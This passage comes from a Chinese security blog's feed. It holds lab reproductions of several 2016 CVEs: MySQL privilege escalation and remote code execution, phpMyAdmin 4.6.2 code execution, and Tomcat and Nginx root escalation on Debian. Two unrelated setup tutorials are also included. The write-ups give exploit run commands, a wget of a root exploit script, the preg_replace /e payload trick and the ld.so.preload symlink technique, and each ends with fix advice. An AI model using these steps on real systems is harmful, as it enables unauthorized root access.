alt="6.png"><br>倒回去看RMIRegistryExploit.java，className来源于CommonsCollections1，跟踪CommonsCollections1类（ysoserial.payloads. CommonsCollections1），该类继承了PayloadRunner。<br><img src="https://i.loli.net/2018/05/30/5b0e449736dab.png" alt="7.png"><br>跟踪PayloadRunner（ysoserial.payloads.util. PayloadRunner）的run方法，在第22行发现该方法将传进来的args、clazz并发设为新对象并转换成byte。<br><img src="https://i.loli.net/2018/05/30/5b0e44ad5b96b.png" alt="8.png"><br>第29行使用Deserializer.deserialize将serialized反序列化赋值为对象obj。<br><img src="https://i.loli.net/2018/05/30/5b0e44ceb5e6d.png" alt="9.png"><br>倒回去看CommonsCollections1，第41行到53行，用Transformer创建了transformers数组，数组中按顺序包含了ConstantTransformer、InvokerTransformer、InvokerTransformer、InvokerTransformer、ConstantTransformer对象。<br><img src="https://i.loli.net/2018/05/30/5b0e44ecea5c2.png" alt="10.png"><br>ConstantTransformer获取其构造函数中传入的类；InvokerTransformer执行其构造函数中传入的方法。<br>跟踪transformers，第58行使用Reflections.setFieldValue();方法：利用反射机制，将transformerChain对象的iTransformers属性赋值为transformers。<br><img src="https://i.loli.net/2018/05/30/5b0e450509c5f.png" alt="11.png"></p><h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><ol><li>升级Tomcat</li><li>改变JMX密码认证</li></ol><!-- rebuild by neat -->]]></content>
      <categories>
        <category>安全研究</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2016-6663分析</title>
    <url>/archives/e5fd1c70.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>针对MySQL / MariaDB / PerconaDB - 提权/条件竞争漏洞进行复现并分析。<br><img src="https://i.loli.net/2018/05/29/5b0d484a0d66a.png" alt="success.png"></p><a id="more"></a><h1 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h1><p>存在条件竞争漏洞，导致本地用户使用低权限帐号提升到数据库系统用户。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>查看数据库版本:mysql -V。<br><img src="https://i.loli.net/2018/05/29/5b0d489f8ad05.png" alt="version.png"><br>建立低权限数据库用户，并新建库。<br><img src="https://i.loli.net/2018/05/29/5b0d48bf99c39.png" alt="user.png"><br><img src="https://i.loli.net/2018/05/29/5b0d48bf5c145.png" alt="db.png"><br><a href="http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html" target="_blank" rel="noopener">下载CVE-2016-6663 POC</a>，并编译。<br><img src="https://i.loli.net/2018/05/29/5b0d490686b2d.png" alt="download poc.png"><br>查看当前用户id.<br><img src="https://i.loli.net/2018/05/29/5b0d491b8fad2.png" alt="user id.png"><br>运行CVE-2016-6663 POC。<br><img src="https://i.loli.net/2018/05/29/5b0d493ed9890.png" alt="run poc.png"><br>下载CVE-2016-6664 POC 并更改权限。<br><img src="https://i.loli.net/2018/05/29/5b0d495c31081.png" alt="run 2.png"><br>运行CVE-2016-6664 POC。</p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>MySQL数据库可以通过data directory指定存储目录，并将目录权限更改为mysql。<br><img src="https://i.loli.net/2018/05/29/5b0d497dafba7.png" alt="data.png"><br><img src="https://i.loli.net/2018/05/29/5b0d4996a0680.png" alt="directory.png"></p><h2 id="复现注意事项"><a href="#复现注意事项" class="headerlink" title="复现注意事项"></a>复现注意事项</h2><p>缺少mysql.h，安装libmysqlclient-dev。<br><img src="https://i.loli.net/2018/05/29/5b0d49c2a0e6a.png" alt="libmysqlclient-dev.png"></p><h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><ol><li>升级MySQL；</li><li>在my.cnf中添加：symbolic-links = 0。</li></ol><!-- rebuild by neat -->]]></content>
      <categories>
        <category>安全研究</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2016-6662分析</title>
    <url>/archives/438a17c4.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>针对MySQL Code Execution Privilege Escalation进行漏洞复现并分析。<br><img src="https://i.loli.net/2018/05/28/5b0bf1a7cd28e.png" alt="success.png"></p><a id="more"></a><h1 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h1><p>在MySQL / MariaDB / PerconaDB 5.5.52 / 5.6.33 / 5.7.15等版本中，默认安装MySQL使用自带mysqld_safe脚本启动mysql服务进程，在启动mysql server之前预加载共享库文件，共享库文件可被添加至my.cnf。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>下载<a href="http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html" target="_blank" rel="noopener">cve-2016-6662_MySQL_RCE_exploit.py和mysql_hookandroot_lib.c</a>，并放同一目录下（.so文件运行py时会自动生成）。<br><img src="https://i.loli.net/2018/05/28/5b0bf3652a5b4.png" alt="download.png"><br>修改mysql_hookandroot_lib.c第63行（攻击服务器IP）、64行（监听端口）、65行（my.cnf路径）。<br><img src="https://i.loli.net/2018/05/28/5b0bf382985e0.png" alt="1.png"><br>运行py脚本。</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">python cve<span class="number">-2016</span><span class="number">-6662</span>_MySQL_RCE_exploit.py -dbuser root -dbpass <span class="string">''</span> -dbname pocdb -dbhost <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -mycnf /etc/mysql/my.cnf</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/05/28/5b0bf3cae23f8.png" alt="2.png"><br>这时候，查看/etc/mysql/my.cnf文件，发现共享库已经成功添加。<br><img src="https://i.loli.net/2018/05/28/5b0bf3e481807.png" alt="3.png"><br>重启mysql服务，成功反弹shell。<br><img src="https://i.loli.net/2018/05/28/5b0bf3e481807.png" alt="3.png"></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>默认安装MySQL会自带mysql_safe脚本，启动MySQL之前加载共享库，共享库可以添加至my.cnf。<br>跟进/usr/bin/mysqld_safe，在第331行看到–malloc-lib=LIB 选项可以加载一个so文件。<br><img src="https://i.loli.net/2018/05/28/5b0bf6414a9a3.png" alt="safe mysql.png"><br>在424行，可以看到mysqld_safe从mysql的data目录下载入配置文件my.cnf。<br><img src="https://i.loli.net/2018/05/28/5b0bf65a91e1e.png" alt="my.cnf.png"><br>使用ps aux | grep mysql，查看MySQL的进程信息，发现mysqld_safe是root权限执行的，mysqld是mysql用户执行的。<br><img src="https://i.loli.net/2018/05/28/5b0bf69061dbd.png" alt="ps aux.png"><br>在my.cnf中写入malloc_lib加载so文件的路径。<br><img src="https://i.loli.net/2018/05/28/5b0bf6c216109.png" alt="malloc.png"><br>使用gcc命令将.c（shell）编译成so，并将so放置到/var/lib/mysql/目录下。<br><img src="https://i.loli.net/2018/05/28/5b0bf6de6ed35.png" alt="gcc.png"><br>配置文件和so文件冲准备就绪，重启MySQL，root运行mysqld_safe，mysqld_safe加载so文件，则触发代码执行。</p><h2 id="复现注意事项"><a href="#复现注意事项" class="headerlink" title="复现注意事项"></a>复现注意事项</h2><ol><li>/etc/mysql/my.cnf权限设置：<img src="https://i.loli.net/2018/05/28/5b0bf47b43ac4.png" alt="1-1.png"><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">chown <span class="string">mysql:</span>root <span class="regexp">/etc/</span>mysql/my.cnf</span><br><span class="line">chmod <span class="number">600</span> <span class="regexp">/etc/</span>mysql/my.cnf</span><br></pre></td></tr></table></figure></li><li>攻击会在攻击database新建一个表，表名为:poctable，如果攻击失败，重新攻击需将poctable删除。<img src="https://i.loli.net/2018/05/28/5b0bf580c08c5.png" alt="2-2.png"><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p；</span><br><span class="line"><span class="keyword">use</span> pocdb;（攻击database的数据库名字）</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> poctable;</span><br></pre></td></tr></table></figure></li><li>py脚本会自动运行nc，因此攻击服务器需要安装nc。</li><li>如果攻击端口不为3306，可以在cve-2016-6662_MySQL_RCE_exploit.py第74行增加自定义端口代码。增加完成之后，即可使用-dbport自定义端口。在第83行，增加代码将其使用。<img src="https://i.loli.net/2018/05/28/5b0bf5dd46899.png" alt="3-3.png">)<img src="https://i.loli.net/2018/05/28/5b0bf604c841e.png" alt="4-4.png"><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">parser.add_argument(<span class="string">'-dbport'</span>, <span class="attribute">dest</span>=<span class="string">'TARGET_PORT'</span>, <span class="attribute">required</span>=<span class="literal">True</span>, <span class="attribute">help</span>=<span class="string">'MySQL port'</span>) # 74行</span><br><span class="line">dbconn = mysql.connector.connect(<span class="attribute">user</span>=args.TARGET_USER, password =args.TARGET_PASS, <span class="attribute">database</span>=args.TARGET_DB, <span class="attribute">host</span>=args.TARGET_HOST, <span class="attribute">port</span>=args.TARGET_PORT) # 83行</span><br></pre></td></tr></table></figure><h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1>升级MySQL。</li></ol><!-- rebuild by neat -->]]></content>
      <categories>
        <category>安全研究</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2016-5734分析</title>
    <url>/archives/94f683da.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>针对phpMyAdmin 4.6.2 - Authenticated Remote Code Execution进行漏洞复现并分析。<br><img src="https://i.loli.net/2018/05/28/5b0bad646bb23.png" alt="html.png"></p><a id="more"></a><h1 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h1><p>phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。在4.6.2版本中preg_replace /触发的callback导致命令执行。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p><a href="https://www.exploit-db.com/exploits/40185/" target="_blank" rel="noopener">下载</a>POC并执行即可。<br><img src="https://i.loli.net/2018/05/28/5b0bac6432b3e.png" alt="success.png"></p><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这个漏洞出现在TableSearchController.php中的getRegexReplaceRows函数。<br>跟进/libraries/controllers/table/TableSearchController.php，第708行定义getRegexReplaceRows函数，在第731行处$find存在任意一个范围符号的时候,在$find前面加上/。<br><img src="https://i.loli.net/2018/05/28/5b0baf42577df.png" alt="1.png"><br>在661行getReplacePreview函数调用了getRegexReplaceRows。<br><img src="https://i.loli.net/2018/05/28/5b0baf426791f.png" alt="2.png"><br>在613行findAction函数调用了getReplacePreview。<br><img src="https://i.loli.net/2018/05/28/5b0baf4266236.png" alt="3.png"><br>在175行indexAction函数调用了findAction，当searchType为replace调用findAction。<br><img src="https://i.loli.net/2018/05/28/5b0baf4264c4b.png" alt="4.png"><br>在/tbl_find_replace.php第33行调用indexAction。<br><img src="https://i.loli.net/2018/05/28/5b0baf42622fe.png" alt="5.png"><br>根据以上可得知，调用getRegexReplaceRows函数的流程为：</p><figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">/tbl_find_replace.ph →</span><br><span class="line">/libraries/controllers/<span class="keyword">table</span>/TableSearchController.php <span class="comment">indexAction()</span> →</span><br><span class="line">/libraries/controllers/<span class="keyword">table</span>/TableSearchController.php <span class="comment">findAction()</span> →</span><br><span class="line">/libraries/controllers/<span class="keyword">table</span>/TableSearchController.php <span class="comment">getReplacePreview()</span> →</span><br><span class="line">/libraries/controllers/<span class="keyword">table</span>/TableSearchController.php <span class="comment">_getRegexReplaceRows()</span></span><br></pre></td></tr></table></figure><p>当row[0]成功匹配$find即可执行命令，在716，717行存在db、table两个成员。<br><img src="https://i.loli.net/2018/05/28/5b0baf426366e.png" alt="6.png"><br>在/libraries/controllers/TableController.php第20、25行分别定义了$db、$table。<br><img src="https://i.loli.net/2018/05/28/5b0baf4260f61.png" alt="7.png"><br>回溯Controller类，跟进/libraries/di/Container.php，在51行定义get函数。<br><img src="https://i.loli.net/2018/05/28/5b0baf425f9e6.png" alt="8.png"><br>当$find构造为0/e0，preg_replace将$find变成/0/e0/，在php5.5以下发生截断，变成preg_replace(/0/e, command,0/e)。由此代码执行产生。</p><h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>升级phpMyAdmin。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>安全研究</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2016-1240分析</title>
    <url>/archives/29004be5.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>针对Apache Tomcat 8/7/6 (Debian-Based Distros) - Privilege Escalation进行漏洞复现并分析。<br><a href="https://i.loli.net/2018/05/27/5b0ab46ce5759.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/05/27/5b0ab46ce5759.png" alt="success.png"></a></p><a id="more"></a><h1 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h1><p>Debian系统的Linux上，使用apt-get安装Tomcat时,deb包安装的Tomcat程序会自动为管理员安装一个启动脚本：/etc/init.d/tomcat* 利用该脚本，可导致攻击者通过低权限的Tomcat用户获得系统root权限。只需要将Tomcat的日志文件catalina.out软链接到系统文件，重新打开catalina.out就可获取root权限。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>获取<a href="http://legalhackers.com/advisories/Tomcat-DebPkgs-Root-Privilege-Escalation-Exploit-CVE-2016-1240.html" target="_blank" rel="noopener">POC脚本</a>，运行POC脚本。</p><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">./tomcat-rootprivesc-deb.<span class="keyword">sh</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/tomcat7/catalina.<span class="keyword">out</span></span><br></pre></td></tr></table></figure><p><a href="https://i.loli.net/2018/05/27/5b0ab574c2c89.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/05/27/5b0ab574c2c89.png" alt="run poc.png"></a><br>运行之后/var/log/catalina.out的链接已经指向/etc/ld.so.preload。<br><a href="https://i.loli.net/2018/05/27/5b0ab59f1aec0.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/05/27/5b0ab59f1aec0.png" alt="run end.png"></a><br>重启Tomcat服务。</p><figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">serverce tomcat7 <span class="built_in">restart</span></span><br></pre></td></tr></table></figure><h2 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h2><p>POC脚本85行判断用户是否为tomcat用户。<br><a href="https://i.loli.net/2018/05/27/5b0ab64865e90.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/05/27/5b0ab64865e90.png" alt="1.png"></a><br>93行判断指定的tomcat日志文件是否存在。<br><a href="https://i.loli.net/2018/05/27/5b0ab656db9dd.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/05/27/5b0ab656db9dd.png" alt="2.png"></a><br>158行删除日志文件并软链接到/etc/ld.so.preload。<br><a href="https://i.loli.net/2018/05/27/5b0ab656de8a8.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/05/27/5b0ab656de8a8.png" alt="3.png"></a><br>168行判断/etc/ld.so.preload文件是否存在。<br><a href="https://i.loli.net/2018/05/27/5b0ab656dff2c.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/05/27/5b0ab656dff2c.png" alt="4.png"></a><br>188行通过判断/tmp/tomcatrootsh文件是否具有rws 权限 root 匹配到返回0。<br><a href="https://i.loli.net/2018/05/27/5b0ab656e13df.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/05/27/5b0ab656e13df.png" alt="5.png"></a><br>199行删除/etc/ld.so.preload和/tmp/privesclib.so。<br><a href="https://i.loli.net/2018/05/27/5b0ab656e2b76.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/05/27/5b0ab656e2b76.png" alt="6.png"></a><br>跟踪$BACKDOORPATH变量，在148行$BACKDOORPATH是从$BACKDOORSH复制而来，根据开头变量的定义发现$BACKDOORSH为/bin/bash。<br><a href="https://i.loli.net/2018/05/27/5b0ab656dd0f9.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/05/27/5b0ab656dd0f9.png" alt="7.png"></a></p><h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>升级Tomcat。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>安全研究</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>python3 pip缺失VC++</title>
    <url>/archives/f62064af.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>最近使用python3的pip安装scrapy、mysql-python等库出错，需要安装Microsoft Visual C++。网上资料大部分通过源码方式解决，不能一劳永逸解决。这里我从根源解决。<br><img src="https://i.loli.net/2018/05/23/5b0549c166495.png" alt="success.png"></p><a id="more"></a><h1 id="VC-缺失"><a href="#VC-缺失" class="headerlink" title="VC++缺失"></a>VC++缺失</h1><p>使用<code>pip install scrapy</code>安装scrapy出现缺失VC++。<br><img src="https://i.loli.net/2018/05/23/5b054a41e5f7d.png" alt="pip install scrapy.png"><br>根据报错信息打开<a href="http://landinghub.visualstudio.com/visual-cpp-build-tools" target="_blank" rel="noopener">VC Build Tools站点</a><br><img src="https://i.loli.net/2018/05/23/5b054a8bcc27d.png" alt="web vc.png"><br>点击红框中的链接，找到Visual Studio 2017 生成工具下载对应文件。<br><img src="https://i.loli.net/2018/05/23/5b054ac26425e.png" alt="vc build.png"><br>打开下载下来的vs_buildtools程序，勾选Visual C++生成工具，进行安装。<br><img src="https://i.loli.net/2018/05/23/5b054b2ecdc28.png" alt="VC++.png"><br>接下来安静等待安装完成。<br><img src="https://i.loli.net/2018/05/23/5b054b5ccd253.png" alt="SDK install.png"><br><img src="https://i.loli.net/2018/05/23/5b054b5d01b22.png" alt="install success.png"><br>安装完成之后，再使用<code>pip install scrapy</code>即可成功安装。<br><img src="https://i.loli.net/2018/05/23/5b0549c166495.png" alt="success.png"></p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>Python基础</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>Python3</tag>
      </tags>
  </entry>
  <entry>
    <title>Go-VSCode环境搭建</title>
    <url>/archives/c70ca2a9.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>最近项目上用到了Go，因此对VSCode进行Go环境搭建。效果图如下：<br><img src="https://i.loli.net/2018/05/20/5b00d3916250e.png" alt="GO debug.png"></p><a id="more"></a><h1 id="Go"><a href="#Go" class="headerlink" title="Go"></a>Go</h1><h2 id="Go安装"><a href="#Go安装" class="headerlink" title="Go安装"></a>Go安装</h2><p>去<a href="https://golang.org" target="_blank" rel="noopener">Golang官网</a>下载对应版本的安装包，我这里是Windows操作系统，因此下载<a href="https://dl.google.com/go/go1.10.2.windows-amd64.msi" target="_blank" rel="noopener">go1.10.2.windows-amd64.msi</a>。由于Golang官网需要科学上网，如果没有翻墙的软件，可以去<a href="https://studygolang.com/" target="_blank" rel="noopener">Go语言中文网</a>下载，<a href="https://studygolang.com/dl" target="_blank" rel="noopener">下载页面</a>。<br>安装过程直接Next过去即可。<br><img src="https://i.loli.net/2018/05/20/5b00da8e4989c.png" alt="go install.png"><br>安装完成之后，打开CMD输入go version查看go 版本信息。<br><img src="https://i.loli.net/2018/05/20/5b00dbbc39baf.png" alt="go version.png"></p><h2 id="Go环境配置"><a href="#Go环境配置" class="headerlink" title="Go环境配置"></a>Go环境配置</h2><p>Go安装完成之后，在CMD下输入go env查看go的环境变量。<br><img src="https://i.loli.net/2018/05/20/5b00dc06a590d.png" alt="go env.png"><br>有两个关键的变量：GOROOT、GOPATH。GOROOT为Go安装目录不需要进行修改，GOPATH为Go项目地址可以进行修改。在喜欢的地方建立一个Go项目目录。这里我在C盘根目录下建立一个文件夹，名称为GoWork。然后将其配置到系统环境变量中。<br><img src="https://i.loli.net/2018/05/20/5b00dc9760002.png" alt="sys env.png"><br>配置完成之后，重新打开一个CMD输入go env查看是否生效。<br><img src="https://i.loli.net/2018/05/20/5b00dcd52d8c5.png" alt="go path env.png"><br>到此Go的配置告一段落。</p><h1 id="VSCode"><a href="#VSCode" class="headerlink" title="VSCode"></a>VSCode</h1><h2 id="VSCode安装"><a href="#VSCode安装" class="headerlink" title="VSCode安装"></a>VSCode安装</h2><p>去<a href="https://code.visualstudio.com/" target="_blank" rel="noopener">Visual Studio Code官网</a>下载对应版本的安装包安装即可。安装过程直接Next过去即可。<br><img src="https://i.loli.net/2018/05/20/5b00dd3f6b8dd.png" alt="VSCode.png"><br>VSCode安装完成之后需要配置Git，可以查看这篇文章，这里就不展开了。<br><img src="https://i.loli.net/2018/05/20/5b00e068e3f6f.png" alt="vscode gui.png"></p><h2 id="VSCode环境配置"><a href="#VSCode环境配置" class="headerlink" title="VSCode环境配置"></a>VSCode环境配置</h2><h3 id="Go插件安装"><a href="#Go插件安装" class="headerlink" title="Go插件安装"></a>Go插件安装</h3><p>在VSCode商店里面安装对应Go插件。可以直接通过VSCode欢迎使用页面的自定义→工具和语言→更多进行跳转。<br><img src="https://i.loli.net/2018/05/20/5b00e09ab3585.png" alt="vscode go install.png"><br>安装完成之后打开Go项目文件夹，新建一个hello.go，打开hello.go，在右小角进行点击Install All安装所依赖的库（该步骤需要翻墙）。<br><img src="https://i.loli.net/2018/05/20/5b00e2ab752db.png" alt="vscode go install all.png"><br>安装完成之后，在工作目录下会多出一个bin子目录里面会放所需要的exe文件。如果翻不了墙，那么可以直接下载这个，放到Go项目文件夹下的bin目录即可。<br><code>链接：https://pan.baidu.com/s/19w01LlfY8iEsLm5gJmP5Lw 密码：umao</code></p><h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h2><p>完成以上操作之后，可以通过F5进行Debug。<br><img src="https://i.loli.net/2018/05/20/5b00e5add6cd9.png" alt="vscode go debug.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在进行VSCode进行Go Debug时，遇到了几个需要注意点，在此记录一下供诸君参考：</p><ol><li>完成Go安装之后，需要进行GOPATH环境变量配置，便于项目目录查找；</li><li>完成VSCode安装之后，在VSCode的终端里面输入go命令查看VSCode是否能调用系统环境变量。如果在VSCode终端找不到go命令，在用户环境变量里面进行添加可以解决该问题。假设还解决不了，直接在终端进行path环境变量追加<code>set path=%path%;C:\go\bin</code>；</li><li>如果VSCode依赖的库安装失败，直接把src、bin、pkg目录都删除，然后重新安装。<h1 id="Go代码"><a href="#Go代码" class="headerlink" title="Go代码"></a>Go代码</h1><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">"Hello, Hywell"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><!-- rebuild by neat -->]]></content>
      <categories>
        <category>代码基础</category>
      </categories>
      <tags>
        <tag>环境搭建</tag>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2016-1247分析</title>
    <url>/archives/eca7756b.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>针对CVE-2016-1247漏洞进行复现、研究分析原理。<br><img src="https://i.loli.net/2018/05/27/5b0a99128c972.png" alt="success.png"></p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Nginx是一个高性能的HTTP和反向代理服务器，也是一个 IMAP/POP3/SMTP 代理服务器。 Nginx 是由 Igor Sysoev 为俄罗斯访问量第二的 Rambler.ru 站点开发的，第一个公开版本0.1.0发布于2004年10月4日。其将源代码以类BSD许可证的形式发布，因它的稳定性、丰富的功能集、示例配置文件和低系统资源的消耗而闻名。2011年6月1日，nginx 1.0.4发布。 Nginx是一款轻量级的Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器，并在一个BSD-like 协议下发行。由俄罗斯的程序设计师Igor Sysoev所开发，其特点是占有内存少，并发能力强。</p><h1 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h1><p>Debian、Ubuntu发行版的Nginx在新建日志目录的时，使用了不安全的权限，因此本地恶意攻击者可以从nginx/web用户权限(www-data)提升到ROOT。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>查看用户ID<br><img src="https://i.loli.net/2018/05/27/5b0a99a92f715.png" alt="id.png"><br>查看Nginx版本<code>dpkg -l | grep -i nginx</code><br><img src="https://i.loli.net/2018/05/27/5b0a99c78ea14.png" alt="nginx version.png"><br>下载poc脚本</p><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">wget http<span class="variable">s:</span>//legalhackers.<span class="keyword">com</span>/exploits/CVE-<span class="number">2016</span>-<span class="number">1247</span>/nginxed-root.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/05/27/5b0a9b092c3ec.png" alt="wget.png"><br>修改poc权限,并执行poc</p><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">chmod 777 nginxed-root.<span class="keyword">sh</span></span><br><span class="line">./nginxed-root.<span class="keyword">sh</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/nginx/<span class="keyword">error</span>.<span class="keyword">log</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/02/01/5a72bfed2d1c2.png" alt="run.png"><br>查看现在用户ID<br><img src="https://i.loli.net/2018/05/27/5b0a9bb689f58.png" alt="final id.png"></p><h2 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h2><p>查看Nginx日志目录权限，发现为www-data，因此该漏洞需要使用www-data用户进行<br><img src="https://i.loli.net/2018/02/01/5a72c0782bbd3.png" alt="www-data.png"><br>查看Nginx日志目录下的文件权限，发现为root权限，通过符号链接将替换日志文件实现提权目的<br><img src="https://i.loli.net/2018/02/01/5a72c08966ad5.png" alt="root.png"><br>根据POC进行利用分析，在145行使用dlsym获取euid<br>在147、148行修改/tmp/nginxrootsh文件的所有者和权限<br>在149行删除/etc/ld.so.preload文件<br><img src="https://i.loli.net/2018/02/01/5a72c0a10d21f.png" alt="code.png"><br>在154行编译生成的c文件，在其后判断是否编译成功<br><img src="https://i.loli.net/2018/02/01/5a72c0b003134.png" alt="make.png"><br>在162行将/bin/bash拷贝到/tmp/nginxrootsh<br><img src="https://i.loli.net/2018/02/01/5a72c0c48ba68.png" alt="copy.png"><br>在172行删除nginx的错误日志文件并进行符号链接，将/etc/ld.so.preload（目标）软链接到nginx的错误日志（这步骤实现了提权）<br><img src="https://i.loli.net/2018/02/01/5a72c0d7d17c2.png" alt="delete.png"><br>在187行将/etc/ld.so.preload内容覆盖为/tmp/privesclib.so（加载/tmp/privesclib.so共享库）<br><img src="https://i.loli.net/2018/02/01/5a72c0f12d27a.png" alt="copy.png"><br>在199行将/etc/ld.so.preload权限设置为755<br><img src="https://i.loli.net/2018/02/01/5a72c0ff840bc.png" alt="chmod.png"></p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>root用户执行logrotate -f /etc/logrotate.d/nginx，未获取到root权限情况下重启nginx服务并删除相关文件。<br><img src="https://i.loli.net/2018/05/27/5b0a9c0b508d9.png" alt="root command.png"></p><h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>升级Nginx版本。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>安全研究</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透笔记整理</title>
    <url>/archives/ff82748e.html</url>
